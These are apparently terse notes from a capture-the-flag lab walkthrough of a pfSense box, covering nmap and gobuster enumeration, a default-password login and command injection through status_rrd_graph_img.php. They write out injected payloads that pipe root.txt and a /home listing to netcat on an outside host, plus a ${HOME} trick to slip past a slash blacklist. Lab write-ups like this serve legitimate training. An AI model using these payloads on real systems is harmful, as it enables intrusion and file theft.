# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/sense 10.10.10.60

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
```

# Port 443
gobuster

finds a system-users.txt file
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

guess pwd of pfsense? yay it works.

# pfsense application
exp script wont work.
```
https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh
```

exfil with nc.
```
;echo eljay | nc 10.10.14.21 9001
```

cant do a revshell?
`/` is blacklisted. So is `&`

root.txt:
```
queues;cat+${HOME}root${HOME}root.txt+|+nc+10.10.14.21+9001
```

find the user on the box:
```
queues;find+${HOME}home|+nc+10.10.14.21+9001

/home
/home/.snap
/home/rohit
/home/rohit/.tcshrc
/home/rohit/user.txt
```

user.txt:
```
8721327cc232073b40d27d9c17e7348b
```